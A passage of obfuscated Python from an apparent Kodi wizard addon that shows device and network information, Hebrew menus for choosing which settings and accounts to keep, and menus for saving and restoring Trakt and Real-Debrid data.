	O0O000O000O000OO0 =[];O0O00OOO00OO0O000 =0 #line:2759
	for O0OO00OOO00OOO00O in OO0000000O000O0OO :#line:2760
		O0O0OOOOO0O0O000O =wiz .getInfo (O0OO00OOO00OOO00O )#line:2761
		OO00O0000OOO00000 =0 #line:2762
		while O0O0OOOOO0O0O000O =="Busy"and OO00O0000OOO00000 <10 :#line:2763
			O0O0OOOOO0O0O000O =wiz .getInfo (O0OO00OOO00OOO00O );OO00O0000OOO00000 +=1 ;wiz .log ("%s sleep %s"%(O0OO00OOO00OOO00O ,str (OO00O0000OOO00000 )));xbmc .sleep (1000 )#line:2764
		O0O000O000O000OO0 .append (O0O0OOOOO0O0O000O )#line:2765
		O0O00OOO00OO0O000 +=1 #line:2766
	OO0000O0OOO00O0O0 =O0O000O000O000OO0 [8 ]if 'Una'in O0O000O000O000OO0 [8 ]else wiz .convertSize (int (float (O0O000O000O000OO0 [8 ][:-8 ]))*1024 *1024 )#line:2767
	O0OOO00OO0O00OOO0 =O0O000O000O000OO0 [9 ]if 'Una'in O0O000O000O000OO0 [9 ]else wiz .convertSize (int (float (O0O000O000O000OO0 [9 ][:-8 ]))*1024 *1024 )#line:2768
	O0O0OO0OO0O0O0OO0 =O0O000O000O000OO0 [10 ]if 'Una'in O0O000O000O000OO0 [10 ]else wiz .convertSize (int (float (O0O000O000O000OO0 [10 ][:-8 ]))*1024 *1024 )#line:2769
	OOO0O0OO0O0OO00O0 =wiz .convertSize (int (float (O0O000O000O000OO0 [11 ][:-2 ]))*1024 *1024 )#line:2770
	O0OO0O00O0OO0OOOO =wiz .convertSize (int (float (O0O000O000O000OO0 [12 ][:-2 ]))*1024 *1024 )#line:2771
	OOOOO00OO0OOO0OOO =wiz .convertSize (int (float (O0O000O000O000OO0 [13 ][:-2 ]))*1024 *1024 )#line:2772
	OOOO0OOO0OOOOOOOO ,OO0O000OO0OO00OO0 ,OO0000O0OOOOOO0O0 =getIP ()#line:2773
	OO0O00OOOO0O00O0O =[];O000OO00OO0OO0O00 =[];O0000O0OOO00OO0OO =[];OO00O00O00O0O0OO0 =[];OOOOOO0O00O0O0O00 =[];O0O0O0O0OOO00OO00 =[];OOO0O0OO0O0OOOOOO =[]#line:2775
	OOO000O0OOO000O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2777
	for OOO00O0000OOOO00O in sorted (OOO000O0OOO000O0O ,key =lambda O0OOOO00OO00000OO :O0OOOO00OO00000OO ):#line:2778
		OO0OOO00000OO000O =os .path .split (OOO00O0000OOOO00O [:-1 ])[1 ]#line:2779
		if OO0OOO00000OO000O =='packages':continue #line:2780
		O00OOO00O0OOO000O =os .path .join (OOO00O0000OOOO00O ,'addon.xml')#line:2781
		if os .path .exists (O00OOO00O0OOO000O ):#line:2782
			O0OO0O00OO0OO0OO0 =open (O00OOO00O0OOO000O )#line:2783
			O0O000O0OO0O000OO =O0OO0O00OO0OO0OO0 .read ()#line:2784
			OO0000OOO00O00OO0 =re .compile ("<provides>(.+?)</provides>").findall (O0O000O0OO0O000OO )#line:2785
			if len (OO0000OOO00O00OO0 )==0 :#line:2786
				if OO0OOO00000OO000O .startswith ('skin'):OOO0O0OO0O0OOOOOO .append (OO0OOO00000OO000O )#line:2787
				if OO0OOO00000OO000O .startswith ('repo'):OOOOOO0O00O0O0O00 .append (OO0OOO00000OO000O )#line:2788
				else :O0O0O0O0OOO00OO00 .append (OO0OOO00000OO000O )#line:2789
			elif not (OO0000OOO00O00OO0 [0 ]).find ('executable')==-1 :OO00O00O00O0O0OO0 .append (OO0OOO00000OO000O )#line:2790
			elif not (OO0000OOO00O00OO0 [0 ]).find ('video')==-1 :O0000O0OOO00OO0OO .append (OO0OOO00000OO000O )#line:2791
			elif not (OO0000OOO00O00OO0 [0 ]).find ('audio')==-1 :O000OO00OO0OO0O00 .append (OO0OOO00000OO000O )#line:2792
			elif not (OO0000OOO00O00OO0 [0 ]).find ('image')==-1 :OO0O00OOOO0O00O0O .append (OO0OOO00000OO000O )#line:2793
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2795
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O000O000OO0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2796
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O000O000OO0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2797
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2798
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O000O000OO0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2799
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O000O000OO0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2800
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2802
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O000O000OO0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2803
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O000O000OO0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2804
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2806
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000O0OOO00O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2807
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO0O00OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2808
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO0OO0O0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2809
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2811
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0OO0O0OO00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2812
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O00O0OO0OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2813
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00OO0OOO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2814
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2816
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O000O000OO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2817
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOO0OOOOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2818
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000OO0OO00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2819
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000O0OOOOOO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2820
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O000O000OO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2821
	O00O00OOOOO00OO0O =len (OO0O00OOOO0O00O0O )+len (O000OO00OO0OO0O00 )+len (O0000O0OOO00OO0OO )+len (OO00O00O00O0O0OO0 )+len (O0O0O0O0OOO00OO00 )+len (OOO0O0OO0O0OOOOOO )+len (OOOOOO0O00O0O0O00 )#line:2823
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O00O00OOOOO00OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2824
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000O0OOO00OO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2825
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O00O00O0O0OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2826
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000OO00OO0OO0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2827
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O00OOOO0O00O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2828
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOO0O00O0O0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2829
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O0OO0O0OOOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2830
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O0O0OOO00OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2831
def Menu ():#line:2832
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2833
def saveMenu ():#line:2835
	OO00OO0OOOO0OO00O ='[COLOR green]מופעל[/COLOR]';O0OOOO0O0OO0O0OOO ='[COLOR red]מבוטל[/COLOR]'#line:2837
	O00O00000OO0O00O0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2838
	OOO0O0OOOOOOO000O ='true'if KEEPMOVIELIST =='true'else 'false'#line:2839
	OOOO0OOO0OOO0O000 ='true'if KEEPINFO =='true'else 'false'#line:2840
	OO00O0000O0O0O00O ='true'if KEEPSOUND =='true'else 'false'#line:2842
	O00000OO0OOOOO0O0 ='true'if KEEPVIEW =='true'else 'false'#line:2843
	O00OOOOOO0O00O000 ='true'if KEEPSKIN =='true'else 'false'#line:2844
	O00OOOOOOOO0OOOOO ='true'if KEEPSKIN2 =='true'else 'false'#line:2845
	O0O0OO0O00O0O0OO0 ='true'if KEEPSKIN3 =='true'else 'false'#line:2846
	O00OO00OOO0000OO0 ='true'if KEEPADDONS =='true'else 'false'#line:2847
	O0O0OOOOOO0O00OOO ='true'if KEEPPVR =='true'else 'false'#line:2848
	OOOO0OO00OOO000O0 ='true'if KEEPTVLIST =='true'else 'false'#line:2849
	OOO00OO0OO0000OO0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2850
	O00OO0O000O0OOO00 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2851
	O0O0O0O0O0O0OOO00 ='true'if KEEPHUBTV =='true'else 'false'#line:2852
	OO0O0O00O000OO000 ='true'if KEEPHUBVOD =='true'else 'false'#line:2853
	O0OO00OO0O00000O0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:2854
	OO00000O0O000000O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2855
	OO0O00O0O0O0O0O00 ='true'if KEEPHUBMENU =='true'else 'false'#line:2856
	OO0O0OO000O0OOO0O ='true'if KEEPPLAYLIST =='true'else 'false'#line:2857
	O000O0OO000O00OOO ='true'if KEEPTRAKT =='true'else 'false'#line:2858
	O00O0OOO0O0O000O0 ='true'if KEEPREAL =='true'else 'false'#line:2859
	OOO00O0O0000OO0O0 ='true'if KEEPRD2 =='true'else 'false'#line:2860
	OO0O0OOO0O0O00O0O ='true'if KEEPTORNET =='true'else 'true'#line:2861
	O0OOOOOO0000O000O ='true'if KEEPLOGIN =='true'else 'false'#line:2862
	OOO0OOOO0OOOO00OO ='true'if KEEPSOURCES =='true'else 'false'#line:2863
	OO0O000O0O0O00OOO ='true'if KEEPADVANCED =='true'else 'false'#line:2864
	OOO00O0O00O0OO0OO ='true'if KEEPPROFILES =='true'else 'false'#line:2865
	O00OOOOOO0O0OO0OO ='true'if KEEPFAVS =='true'else 'false'#line:2866
	O0O00OO0O00O000O0 ='true'if KEEPREPOS =='true'else 'false'#line:2867
	OOO00OOOO0O0OO00O ='true'if KEEPSUPER =='true'else 'false'#line:2868
	O0OOO0OOO0O0OO0O0 ='true'if KEEPWHITELIST =='true'else 'false'#line:2869
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2873
	if O0OOO0OOO0O0OO0O0 =='true':#line:2874
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2875
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2876
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2877
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2878
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2879
	addFile ('%s התקנת קיר סרטים: '%O00O00000OO0O00O0 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2881
	addFile ('%s שמירת חשבון RD: '%O00O0OOO0O0O000O0 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2882
	addFile ('%s שמירת חשבון טראקט: '%O000O0OO000O00OOO .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2883
	addFile ('%s שמירת מועדפים: '%O00OOOOOO0O0OO0OO .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2886
	addFile ('%s שמירת לקוח טלוויזיה: '%O0O0OOOOOO0O00OOO .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2887
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%OOOO0OO00OOO000O0 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2888
	addFile ('%s שמירת אריח סרטים: '%OOO00OO0OO0000OO0 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2889
	addFile ('%s שמירת אריח סדרות: '%O00OO0O000O0OOO00 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2890
	addFile ('%s שמירת אריח טלויזיה: '%O0O0O0O0O0O0OOO00 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2891
	addFile ('%s שמירת אריח תוכן ישראלי: '%OO0O0O00O000OO000 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2892
	addFile ('%s שמירת אריח ילדים: '%O0OO00OO0O00000O0 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2893
	addFile ('%s שמירת אריח מוסיקה: '%OO00000O0O000000O .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2894
	addFile ('%s שמירת תפריט אריחים ראשי: '%OO0O00O0O0O0O0O00 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2895
	addFile ('%s שמירת כל האריחים בסקין: '%O00OOOOOO0O00O000 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2896
	addFile ('%s שמירת הרחבות שהתקנתי: '%O00OO00OOO0000OO0 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2903
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%OOOO0OOO0OOO0O000 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2904
	addFile ('%s שמירת ספריית סרטים וסדרות: '%OOO0O0OOOOOOO000O .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2907
	addFile ('%s שמירת מקורות וידאו: '%OOO0OOOO0OOOO00OO .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2908
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%OO00O0000O0O0O00O .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2909
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%O00000OO0OOOOO0O0 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2911
	addFile ('%s שמירת פליליסט לאודר: '%OO0O0OO000O0OOO0O .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2912
	addFile ('%s שמירת הרחבות ידנית: '%O0OOO0OOO0O0OO0O0 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2913
	addFile ('%s שמירת הגדרות באפר: '%OO0O000O0O0O00OOO .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2917
	addFile ('%s שמירת סופר מועדפים: '%OOO00OOOO0O0OO00O .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2918
	addFile ('%s שמירת רשימות ריפו: '%O0O00OO0O00O000O0 .replace ('true',OO00OO0OOOO0OO00O ).replace ('false',O0OOOO0O0OO0O0OOO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2919
	setView ('files','viewType')#line:2921
def traktMenu ():#line:2923
	O00O0OOO000OOOOO0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2924
	OO0OO0OOOO00O00OO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2925
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2926
	addFile ('Save Trakt Data: %s'%O00O0OOO000OOOOO0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2927
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO0OO0OOOO00O00OO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2928
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2929
	for O00O0OOO000OOOOO0 in traktit .ORDER :#line:2931
		OOO00OO00000O00O0 =TRAKTID [O00O0OOO000OOOOO0 ]['name']#line:2932
		OO0OOO0OO00OO0O00 =TRAKTID [O00O0OOO000OOOOO0 ]['path']#line:2933
		O00OO0OOO0OOOOO00 =TRAKTID [O00O0OOO000OOOOO0 ]['saved']#line:2934
		OO0O0000O0O00OOOO =TRAKTID [O00O0OOO000OOOOO0 ]['file']#line:2935
		O0OOO000O00O0O0OO =wiz .getS (O00OO0OOO0OOOOO00 )#line:2936
		OO0OOO000O0OOO00O =traktit .traktUser (O00O0OOO000OOOOO0 )#line:2937
		O0OO00000O0OOOO0O =TRAKTID [O00O0OOO000OOOOO0 ]['icon']if os .path .exists (OO0OOO0OO00OO0O00 )else ICONTRAKT #line:2938
		OOOOO00OO00000000 =TRAKTID [O00O0OOO000OOOOO0 ]['fanart']if os .path .exists (OO0OOO0OO00OO0O00 )else FANART #line:2939
		OO000O0000O0O0000 =createMenu ('saveaddon','Trakt',O00O0OOO000OOOOO0 )#line:2940
		O0000O0OOO00O0000 =createMenu ('save','Trakt',O00O0OOO000OOOOO0 )#line:2941
		OO000O0000O0O0000 .append ((THEME2 %'%s Settings'%OOO00OO00000O00O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00O0OOO000OOOOO0 )))#line:2942
		addFile ('[+]-> %s'%OOO00OO00000O00O0 ,'',icon =O0OO00000O0OOOO0O ,fanart =OOOOO00OO00000000 ,themeit =THEME3 )#line:2944
		if not os .path .exists (OO0OOO0OO00OO0O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OO00000O0OOOO0O ,fanart =OOOOO00OO00000000 ,menu =OO000O0000O0O0000 )#line:2945
		elif not OO0OOO000O0OOO00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00O0OOO000OOOOO0 ,icon =O0OO00000O0OOOO0O ,fanart =OOOOO00OO00000000 ,menu =OO000O0000O0O0000 )#line:2946
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOO000O0OOO00O ,'authtrakt',O00O0OOO000OOOOO0 ,icon =O0OO00000O0OOOO0O ,fanart =OOOOO00OO00000000 ,menu =OO000O0000O0O0000 )#line:2947
		if O0OOO000O00O0O0OO =="":#line:2948
			if os .path .exists (OO0O0000O0O00OOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00O0OOO000OOOOO0 ,icon =O0OO00000O0OOOO0O ,fanart =OOOOO00OO00000000 ,menu =O0000O0OOO00O0000 )#line:2949
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00O0OOO000OOOOO0 ,icon =O0OO00000O0OOOO0O ,fanart =OOOOO00OO00000000 ,menu =O0000O0OOO00O0000 )#line:2950
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOO000O00O0O0OO ,'',icon =O0OO00000O0OOOO0O ,fanart =OOOOO00OO00000000 ,menu =O0000O0OOO00O0000 )#line:2951
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2953
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2954
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2955
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2956
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2957
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2958
	setView ('files','viewType')#line:2959
def realMenu ():#line:2961
	OO0OOOO00000O000O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2962
	O0000OO000OOOOO0O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2963
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2964
	addFile ('Save Real Debrid Data: %s'%OO0OOOO00000O000O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2965
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0000OO000OOOOO0O ),'',icon =ICONREAL ,themeit =THEME3 )#line:2966
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2967
	for O0O0O0O0OO00000O0 in debridit .ORDER :#line:2969
		O0OO0OOO00O00OOO0 =DEBRIDID [O0O0O0O0OO00000O0 ]['name']#line:2970
		OO00OOO0OOO00O0OO =DEBRIDID [O0O0O0O0OO00000O0 ]['path']#line:2971
		OO0O0O00OOO000000 =DEBRIDID [O0O0O0O0OO00000O0 ]['saved']#line:2972
		OO0O0OO000OOO0OO0 =DEBRIDID [O0O0O0O0OO00000O0 ]['file']#line:2973
		O0O0OO0OO0O0O000O =wiz .getS (OO0O0O00OOO000000 )#line:2974
		O00OOOOO00OOOOO0O =debridit .debridUser (O0O0O0O0OO00000O0 )#line:2975
		O0OOO0O0O0OOOO00O =DEBRIDID [O0O0O0O0OO00000O0 ]['icon']if os .path .exists (OO00OOO0OOO00O0OO )else ICONREAL #line:2976
		O00O0O00000OO0O0O =DEBRIDID [O0O0O0O0OO00000O0 ]['fanart']if os .path .exists (OO00OOO0OOO00O0OO )else FANART #line:2977
		OOO0OOOO0000OOOO0 =createMenu ('saveaddon','Debrid',O0O0O0O0OO00000O0 )#line:2978
		O0O0O0O0O00000OOO =createMenu ('save','Debrid',O0O0O0O0OO00000O0 )#line:2979
		OOO0OOOO0000OOOO0 .append ((THEME2 %'%s Settings'%O0OO0OOO00O00OOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0O0O0O0OO00000O0 )))#line:2980
		addFile ('[+]-> %s'%O0OO0OOO00O00OOO0 ,'',icon =O0OOO0O0O0OOOO00O ,fanart =O00O0O00000OO0O0O ,themeit =THEME3 )#line:2982
		if not os .path .exists (OO00OOO0OOO00O0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOO0O0O0OOOO00O ,fanart =O00O0O00000OO0O0O ,menu =OOO0OOOO0000OOOO0 )#line:2983
		elif not O00OOOOO00OOOOO0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0O0O0O0OO00000O0 ,icon =O0OOO0O0O0OOOO00O ,fanart =O00O0O00000OO0O0O ,menu =OOO0OOOO0000OOOO0 )#line:2984
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00OOOOO00OOOOO0O ,'authdebrid',O0O0O0O0OO00000O0 ,icon =O0OOO0O0O0OOOO00O ,fanart =O00O0O00000OO0O0O ,menu =OOO0OOOO0000OOOO0 )#line:2985
		if O0O0OO0OO0O0O000O =="":#line:2986
			if os .path .exists (OO0O0OO000OOO0OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0O0O0O0OO00000O0 ,icon =O0OOO0O0O0OOOO00O ,fanart =O00O0O00000OO0O0O ,menu =O0O0O0O0O00000OOO )#line:2987
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0O0O0O0OO00000O0 ,icon =O0OOO0O0O0OOOO00O ,fanart =O00O0O00000OO0O0O ,menu =O0O0O0O0O00000OOO )#line:2988
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0OO0OO0O0O000O ,'',icon =O0OOO0O0O0OOOO00O ,fanart =O00O0O00000OO0O0O ,menu =O0O0O0O0O00000OOO )#line:2989
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2991
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2992
